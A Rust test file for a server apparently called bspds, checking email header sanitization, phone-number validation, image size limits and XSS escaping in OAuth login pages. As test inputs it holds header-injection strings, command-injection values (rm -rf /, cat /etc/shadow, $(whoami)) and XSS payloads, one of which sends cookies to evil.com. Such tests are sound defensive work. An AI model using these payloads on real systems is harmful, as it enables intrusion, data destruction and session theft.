mod common;
use bspds::image::{ImageError, ImageProcessor};
use bspds::comms::{SendError, is_valid_phone_number, sanitize_header_value};
use bspds::oauth::templates::{error_page, login_page, success_page};

#[test]
fn test_header_injection_sanitization() {
    let malicious = "Injected\r\nBcc: attacker@evil.com";
    let sanitized = sanitize_header_value(malicious);
    assert!(!sanitized.contains('\r') && !sanitized.contains('\n'));
    assert!(sanitized.contains("Injected") && sanitized.contains("Bcc:"));

    let normal = "Normal Subject Line";
    assert_eq!(sanitize_header_value(normal), "Normal Subject Line");

    let padded = "  Subject  ";
    assert_eq!(sanitize_header_value(padded), "Subject");

    let multi_newline = "Line1\r\nLine2\nLine3\rLine4";
    let sanitized = sanitize_header_value(multi_newline);
    assert!(!sanitized.contains('\r') && !sanitized.contains('\n'));
    assert!(sanitized.contains("Line1") && sanitized.contains("Line4"));

    let header_injection = "Normal Subject\r\nBcc: attacker@evil.com\r\nX-Injected: value";
    let sanitized = sanitize_header_value(header_injection);
    assert_eq!(sanitized.split("\r\n").count(), 1);
    assert!(sanitized.contains("Normal Subject") && sanitized.contains("Bcc:") && sanitized.contains("X-Injected:"));

    let with_null = "client\0id";
    assert!(sanitize_header_value(with_null).contains("client"));

    let long_input = "x".repeat(10000);
    assert!(!sanitize_header_value(&long_input).is_empty());
}

#[test]
fn test_phone_number_validation() {
    assert!(is_valid_phone_number("+1234567890"));
    assert!(is_valid_phone_number("+12025551234"));
    assert!(is_valid_phone_number("+442071234567"));
    assert!(is_valid_phone_number("+4915123456789"));
    assert!(is_valid_phone_number("+1"));

    assert!(!is_valid_phone_number("1234567890"));
    assert!(!is_valid_phone_number("12025551234"));
    assert!(!is_valid_phone_number(""));
    assert!(!is_valid_phone_number("+"));
    assert!(!is_valid_phone_number("+12345678901234567890123"));

    assert!(!is_valid_phone_number("+abc123"));
    assert!(!is_valid_phone_number("+1234abc"));
    assert!(!is_valid_phone_number("+a"));

    assert!(!is_valid_phone_number("+1234 5678"));
    assert!(!is_valid_phone_number("+ 1234567890"));
    assert!(!is_valid_phone_number("+1 "));

    assert!(!is_valid_phone_number("+123-456-7890"));
    assert!(!is_valid_phone_number("+1(234)567890"));
    assert!(!is_valid_phone_number("+1.234.567.890"));

    for malicious in ["+123; rm -rf /", "+123 && cat /etc/passwd", "+123`id`",
                      "+123$(whoami)", "+123|cat /etc/shadow", "+123\n--help",
                      "+123\r\n--version", "+123--help"] {
        assert!(!is_valid_phone_number(malicious), "Command injection '{}' should be rejected", malicious);
    }
}

#[test]
fn test_image_file_size_limits() {
    let processor = ImageProcessor::new();
    let oversized_data: Vec<u8> = vec![0u8; 11 * 1024 * 1024];
    let result = processor.process(&oversized_data, "image/jpeg");
    match result {
        Err(ImageError::FileTooLarge { .. }) => {}
        Err(other) => {
            let msg = format!("{:?}", other);
            if !msg.to_lowercase().contains("size") && !msg.to_lowercase().contains("large") {
                panic!("Expected FileTooLarge error, got: {:?}", other);
            }
        }
        Ok(_) => panic!("Should reject files over size limit"),
    }

    let processor = ImageProcessor::new().with_max_file_size(1024);
    let data: Vec<u8> = vec![0u8; 2048];
    assert!(processor.process(&data, "image/jpeg").is_err());
}

#[test]
fn test_oauth_template_xss_protection() {
    let html = login_page("<script>alert('xss')</script>", None, None, "test-uri", None, None);
    assert!(!html.contains("<script>") && html.contains("&lt;script&gt;"));

    let html = login_page("client123", Some("<img src=x onerror=alert('xss')>"), None, "test-uri", None, None);
    assert!(!html.contains("<img ") && html.contains("&lt;img"));

    let html = login_page("client123", None, Some("\"><script>alert('xss')</script>"), "test-uri", None, None);
    assert!(!html.contains("<script>"));

    let html = login_page("client123", None, None, "test-uri",
        Some("<script>document.location='http://evil.com?c='+document.cookie</script>"), None);
    assert!(!html.contains("<script>"));

    let html = login_page("client123", None, None, "test-uri", None,
        Some("\" onfocus=\"alert('xss')\" autofocus=\""));
    assert!(!html.contains("onfocus=\"alert") && html.contains("&quot;"));

    let html = login_page("client123", None, None, "\" onmouseover=\"alert('xss')\"", None, None);
    assert!(!html.contains("onmouseover=\"alert"));

    let html = error_page("<script>steal()</script>", Some("<img src=x onerror=evil()>"));
    assert!(!html.contains("<script>") && !html.contains("<img "));

    let html = success_page(Some("<script>steal_session()</script>"));
    assert!(!html.contains("<script>"));

    for (page, name) in [
        (login_page("client", None, None, "uri", None, None), "login"),
        (error_page("err", None), "error"),
        (success_page(None), "success"),
    ] {
        assert!(!page.contains("javascript:"), "{} page has javascript: URL", name);
    }

    let html = login_page("client123", None, None, "javascript:alert('xss')//", None, None);
    assert!(html.contains("action=\"/oauth/authorize\""));
}

#[test]
fn test_oauth_template_html_escaping() {
    let html = login_page("client&test", None, None, "test-uri", None, None);
    assert!(html.contains("&amp;") && !html.contains("client&test"));

    let html = login_page("client\"test'more", None, None, "test-uri", None, None);
    assert!(html.contains("&quot;") || html.contains("&#34;"));
    assert!(html.contains("&#39;") || html.contains("&apos;"));

    let html = login_page("client<test>more", None, None, "test-uri", None, None);
    assert!(html.contains("&lt;") && html.contains("&gt;") && !html.contains("<test>"));

    let html = login_page("my-safe-client", Some("My Safe App"), Some("read write"),
        "valid-uri", None, Some("user@example.com"));
    assert!(html.contains("my-safe-client") || html.contains("My Safe App"));
    assert!(html.contains("read write") || html.contains("read"));
    assert!(html.contains("user@example.com"));

    let html = login_page("client", None, None, "\" onclick=\"alert('csrf')", None, None);
    assert!(!html.contains("onclick=\"alert"));

    let html = login_page("客户端 クライアント", None, None, "test-uri", None, None);
    assert!(html.contains("客户端") || html.contains("&#"));
}

#[test]
fn test_send_error_display() {
    let timeout = SendError::Timeout;
    assert!(!format!("{}", timeout).is_empty());
    assert!(format!("{}", timeout).to_lowercase().contains("timeout"));

    let max_retries = SendError::MaxRetriesExceeded("Server returned 503".to_string());
    let msg = format!("{}", max_retries);
    assert!(!msg.is_empty());
    assert!(msg.contains("503") || msg.contains("retries"));

    let invalid = SendError::InvalidRecipient("bad recipient".to_string());
    assert!(!format!("{}", invalid).is_empty());
}

#[tokio::test]
async fn test_signup_queue_authentication() {
    use common::{base_url, client, create_account_and_login};
    let base = base_url().await;
    let http_client = client();

    let res = http_client.get(format!("{}/xrpc/com.atproto.temp.checkSignupQueue", base))
        .send().await.unwrap();
    assert_eq!(res.status(), reqwest::StatusCode::OK);
    let body: serde_json::Value = res.json().await.unwrap();
    assert_eq!(body["activated"], true);

    let (token, _did) = create_account_and_login(&http_client).await;
    let res = http_client.get(format!("{}/xrpc/com.atproto.temp.checkSignupQueue", base))
        .header("Authorization", format!("Bearer {}", token))
        .send().await.unwrap();
    assert_eq!(res.status(), reqwest::StatusCode::OK);
    let body: serde_json::Value = res.json().await.unwrap();
    assert_eq!(body["activated"], true);
}
